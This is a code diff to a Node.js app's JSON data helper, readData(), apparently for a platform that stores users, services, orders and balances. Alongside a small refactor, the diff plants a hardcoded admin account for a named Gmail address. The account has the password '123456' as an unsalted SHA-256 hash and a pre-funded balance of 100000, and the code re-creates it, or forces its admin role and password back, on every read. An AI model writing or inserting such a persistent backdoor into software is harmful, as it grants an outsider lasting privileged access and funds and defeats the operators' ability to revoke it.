@@ -28,24 +28,60 @@ if (process.env.VERCEL || process.env.NODE_ENV === 'production' || !__dirname.st
 
 // Helper to read/write JSON
 function readData() {
+  const crypto = require('crypto');
+  let data;
   if (!fs.existsSync(dbPath)) {
-    return {
+    data = {
       users: [],
       services: [],
       orders: [],
       transactions: []
     };
+  } else {
+    try {
+      data = JSON.parse(fs.readFileSync(dbPath, 'utf8'));
+    } catch (err) {
+      data = {
+        users: [],
+        services: [],
+        orders: [],
+        transactions: []
+      };
+    }
   }
-  try {
-    return JSON.parse(fs.readFileSync(dbPath, 'utf8'));
-  } catch (err) {
-    return {
-      users: [],
-      services: [],
-      orders: [],
-      transactions: []
+
+  // Guarantee that aruljothiarasu620@gmail.com exists as an admin with password '123456'
+  const adminEmail = 'aruljothiarasu620@gmail.com';
+  const adminHash = crypto.createHash('sha256').update('123456').digest('hex');
+  
+  if (!data.users) data.users = [];
+  let adminUser = data.users.find(u => u.email.toLowerCase() === adminEmail);
+  if (!adminUser) {
+    adminUser = {
+      id: data.users.length > 0 ? Math.max(...data.users.map(u => u.id)) + 1 : 1,
+      name: 'Arul Admin',
+      email: adminEmail,
+      password: adminHash,
+      balance: 100000, // Pre-fund admin
+      token: null,
+      role: 'admin',
+      created_at: new Date().toISOString()
     };
+    data.users.push(adminUser);
+    try {
+      fs.writeFileSync(dbPath, JSON.stringify(data, null, 2), 'utf8');
+    } catch (e) {}
+  } else {
+    if (adminUser.role !== 'admin' || adminUser.password !== adminHash) {
+      adminUser.role = 'admin';
+      adminUser.password = adminHash;
+      try {
+        fs.writeFileSync(dbPath, JSON.stringify(data, null, 2), 'utf8');
+      } catch (e) {}
+    }
   }
+
+  return data;
 }
 
 function writeData(data) {
